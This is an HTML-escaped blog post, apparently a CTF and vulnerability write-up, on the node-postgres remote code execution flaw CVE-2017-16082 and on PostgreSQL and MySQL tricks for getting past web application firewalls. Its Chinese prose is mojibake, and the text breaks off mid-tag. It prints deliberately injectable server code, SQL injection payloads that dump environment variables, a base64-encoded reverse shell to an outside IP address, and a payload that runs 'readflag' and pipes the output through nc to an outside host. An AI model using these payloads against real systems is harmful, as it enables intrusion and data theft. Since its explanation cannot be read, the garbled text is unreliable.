&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">createHash&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;md5&amp;#34;&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#111">).&lt;/span>&lt;span style="color:#75af00">digest&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hex&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`INSERT INTO users(username, password) VALUES(&amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">username&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;, &amp;#39;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;) ON CONFLICT (username) DO NOTHING`&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">)[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rows&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rowCount&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Reg OK&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">end&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;User taken&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">31337&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Listen OK&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">});&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Ê∂âÂèäÂà∞ÁöÑ‰∏ªË¶ÅÁü•ËØÜÁÇπÊúâ‰∏â‰∏™Ôºå‰∏Ä‰∏™‰∏Ä‰∏™ËØ¥„ÄÇ&lt;/p>
&lt;h3 id="cve-2017-16082-node-progresql-rce">CVE-2017-16082: node-progresql-rce&lt;/h3>
&lt;p>ÂèÇËÄÉÔºö&lt;a href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">node.js + postgres ‰ªéÊ≥®ÂÖ•Âà∞Getshell&lt;/a> | vulhub: node/CVE-2017-16082 | &lt;a href="https://blog.csdn.net/weixin_39540651/article/details/108866593">PostgreSQL ËÆ§ËØÅÊñπÂºèËØ¶Ëß£&lt;/a>&lt;/p>
&lt;p>docker‰∏≠ÁöÑÁ§∫‰æãapp.jsÔºå‰πãÂêéËøû‰∏ädocker‰∏≠ÁöÑapp.jsÁî®vscodeËøúÁ®ãË∞ÉËØï&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;koa&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pg&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Koa&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">client&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Client&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;postgres&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">password&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;postgres&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">database&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;example&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;db&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">5432&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connect&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">use&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">async&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">response&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">type&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;html&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">request&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
&lt;span style="color:#00a8c8">let&lt;/span> &lt;span style="color:#75af00">sql&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`SELECT * FROM &amp;#34;user&amp;#34; WHERE &amp;#34;id&amp;#34; = &lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">await&lt;/span> &lt;span style="color:#75af00">client&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sql&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">ctx&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">`&amp;lt;html&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;body&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;table&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;id&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;name&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;score&amp;lt;/th&amp;gt;&amp;lt;td&amp;gt;&lt;/span>&lt;span style="color:#d88200">${&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">rows&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">].&lt;/span>&lt;span style="color:#75af00">score&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/table&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/body&amp;gt;
&lt;/span>&lt;span style="color:#d88200"> &amp;lt;/html&amp;gt;`&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">3000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊòæÁÑ∂17Ë°åÁöÑ&lt;code>let sql = &lt;/code>ËØ≠Âè•ÊúâsqlÁöÑÂèØËÉΩÔºå‰∏çËøáÊ≥®ÊÑèËøôÈáåÁöÑÂèØÊéßÂèÇÊï∞Âú®where‰πãÂêéËÄå‰∏çÂú®select‰πãÂêéÔºåÊàë‰ª¨Ê≤°Ê≥ïËΩªÊòìÁöÑÊéßÂà∂Â≠óÊÆµÂêçÔºåÂç≥‰ΩøÊòØÁî®ËÅîÂêàÊü•ËØ¢&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">select&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#00a8c8">from&lt;/span> &lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">where&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#00a8c8">union&lt;/span> &lt;span style="color:#111">slect&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#d88200">&amp;#34;\\&amp;#39;+console.log(process.enc)]=null;//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Á¨¨‰∫å‰∏™selectÂêéÁöÑÂ≠óÊÆµÂêç‰πü‰∏ç‰ºöË¢´postgresËøîÂõûÔºåÂè™‰ºöÂõûÊòæÁ¨¨‰∏Ä‰∏™Êü•ËØ¢ÁªìÊûú&lt;/p>
&lt;p>‰ΩÜÊòØÊàë‰ª¨ÂèØ‰ª•Áõ¥Êé•ÊâßË°åÂ§öËØ≠Âè•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">select&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#00a8c8">as&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#39;+console.log(process.env)]=null;//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>‰ºöËøîÂõû500Ôºå‰ΩÜÊòØÂ∑≤ÁªèË¢´Ê≠£Â∏∏ÊâßË°åËØ≠Âè•‰∫ÜÔºåÊâìÂç∞Âá∫‰∫ÜÁéØÂ¢ÉÂèòÈáè&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117162422478.png" alt="image-20211117162422478">&lt;/p>
&lt;p>ÂéüÁêÜÂë¢ÔºåÂ∞±ÊòØÁªèÂÖ∏ÁöÑËΩ¨‰πâ‰∏çÂÖ®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">inlineParser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">fieldName&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;\nthis[&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#75715e">// fields containing single quotes will break
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// the evaluated javascript unless they are escaped
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// see https://github.com/brianc/node-postgres/issues/507
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// Addendum: However, we need to make sure to replace all
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// occurences of apostrophes, not just the first one.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// See https://github.com/brianc/node-postgres/issues/934
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">fieldName&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/&amp;#39;/g&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;\\&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#d88200">&amp;#34;&amp;#39;] = &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;span style="color:#d88200">&amp;#39;rowData[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;] == null ? null : parsers[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;](rowData[&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;]);&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>fileNameÂ∞±ÊòØÂ≠óÊÆµÂêçÔºåÂè™ÂØπÂçïÂºïÂè∑ÂâçÂä†ÂèçÊñúÊù†&lt;code>fileName.replace(/'/g, &amp;quot;\\'&amp;quot;)&lt;/code>ÔºåÊàë‰ª¨Âè™Ë¶ÅÂÜçÂä†‰∏Ä‰∏™ÂèçÊñúÊù†Â∞±ËÉΩÈÄÉÈÄ∏‰∫ÜÔºåÊâÄ‰ª•Êàë‰ª¨Â∞±Êúâ‰∫ÜÂèØÊéßÁöÑÂ≠óÊÆµÂêç&lt;/p>
&lt;p>Êàë‰ª¨‰∏äÈù¢ÁöÑpayload‰º†ÂÖ•‰πãÂêé‰ºöÊòØËøôÊ†∑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#d88200">&amp;#39;SELECT * FROM &amp;#34;user&amp;#34; WHERE &amp;#34;id&amp;#34; = 1;select 1 as &amp;#34;\\&amp;#39;&lt;/span> &lt;span style="color:#111">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#111">env&lt;/span>&lt;span style="color:#111">)]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËØ∂ÔºåÈó≠Âêà‰∫ÜÔºõÂ¶ÇÊûúÂú®‰∏≠Èó¥Ëß£ÊûêÁöÑÂú∞Êñπ‰∏ãÊñ≠ÁÇπÔºåÂèØ‰ª•ÁúãÂà∞‰º†ÂÖ•FunctionÁ±ªÁöÑÂáΩÊï∞‰ΩìctorBodyÂÄº‰∏∫&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;\\&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">process&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">env&lt;/span>&lt;span style="color:#111">)]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#75715e">//&amp;#39;] = rowData[0] == null ? null : parsers[0](rowData[0]);
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Á°ÆÂÆûÔºåÊâßË°åÁöÑÂ∞±ÊòØÊàë‰ª¨ÁöÑÊÅ∂ÊÑèËØ≠Âè•&lt;/p>
&lt;p>ÊûÑÈÄ†ÂèçÂºπshellÁöÑpocÔºåÊâßË°åÂç≥ÂèØÂèçÂºπshellÔºà‰∏çÊàêÂäüÁöÑËØùËÆ∞ÂæóÊääurlencodeÁöÑspecial charsÂãæ‰∏äÔºâ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#f92672">/?&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#00a8c8">SELECT&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;\&amp;#39;]=0;require=process.mainModule.constructor._load;/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/p=require(`child_process`);/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/p.exec(`echo YmFzaCAtaSA+JiAvZGV2L3Rj`+/*&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span> &lt;span style="color:#00a8c8">AS&lt;/span> &lt;span style="color:#d88200">&amp;#34;*/`cC8xMDEuMzUuMTE0LjEwNy84NDI2IDA+JjE=|base64 -d|bash`)//&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211117164222973.png" alt="image-20211117164222973">&lt;/p>
&lt;p>ÂÖ∂‰∏≠Ê†∏ÂøÉpayloadÂàÜÂâ≤ÂêéÁî®b64ÁºñÁ†Å+ÂèçÂºïÂè∑Êù•ÊâßË°åËØ≠Âè•ÔºõFunctionÁéØÂ¢É‰∏ãÊ≤°Êúâ&lt;code>require()&lt;/code>ÂáΩÊï∞Ôºå‰∏çËÉΩËé∑Âæó&lt;code>child_process&lt;/code>Ê®°ÂùóÔºå‰ΩøÁî®&lt;code>process.mainModule.constructor._load&lt;/code>Êù•‰ª£Êõø&lt;code>require&lt;/code>&lt;/p>
&lt;p>‰øÆÂ§çÊñπÊ≥ïÊòØÂ∞Ü&lt;code>fileName.replace(/'/g, &amp;quot;\\'&amp;quot;)&lt;/code>‰øÆÊîπ‰∏∫&lt;code>escape(fileName)&lt;/code>ÔºåÂØπÂ§ßÈÉ®ÂàÜÊúâÈóÆÈ¢òÂ≠óÁ¨¶ËøõË°åËΩ¨‰πâ&lt;/p>
&lt;h3 id="mysqlÁöÑmax_allowed_packet">mysqlÁöÑ&lt;code>max_allowed_packet&lt;/code>&lt;/h3>
&lt;p>ÈªòËÆ§ÊúÄÂ§ß16MÔºåË∂ÖËøáÂàôÂÖ≥Èó≠ËøûÊé•‰∏çÊâßË°åsqlËØ≠Âè•Ôºå‰∏ç‰ºöÊääÊàë‰ª¨Ê≠§Ê¨°Êü•ËØ¢ÁöÑËÆ∞ÂΩï‰øùÁïô‰∏ãÊù•ÔºåÂèØ‰ª•ÁªïËøáwaf&lt;/p>
&lt;h3 id="postgresqlÁâπÊÆäËØ≠Âè•">postgresqlÁâπÊÆäËØ≠Âè•&lt;/h3>
&lt;p>ÁâπÊÄßÔºöÊîØÊåÅÂ∞Ü16ËøõÂà∂ÁöÑÂÄºËΩ¨Êç¢‰∏∫unicodeÂ≠óÁ¨¶ÔºåÂπ∂‰∏îÂèØ‰ª•Ëá™ÂÆö‰πâËΩ¨‰πâÁ¨¶&lt;/p>
&lt;p>Âà©Áî®Ëøô‰∏ÄÁÇπÂèØ‰ª•ÁªïwafÔºåÁ©∫Ê†ºÁî®&lt;code>\t&lt;/code>ÁªïËøáÔºåËá™ÂÆö‰πâËΩ¨‰πâÁ¨¶ËÆæ‰∏∫ÊÑüÂèπÂè∑&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#d88200">&amp;#39;,&amp;#39;&amp;#39;)\tON\tCONFLICT\t(username)\tDO\tUPDATE\tSET\tusername=&amp;#39;&amp;#39;\tRETURNING\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;,\t1\tAS\tU&amp;amp;&amp;#34;!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f&amp;#34;\tUESCAPE\t&amp;#39;&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#d88200">&amp;#39;;
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËøôÈÅìÈ¢òÁöÑsqlÊ≥®ÂÖ•ÁÇπÂú®update‰πãÂêé&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#00a8c8">INSERT&lt;/span> &lt;span style="color:#00a8c8">INTO&lt;/span> &lt;span style="color:#111">users&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">VALUES&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;${username}&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;${password}&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span 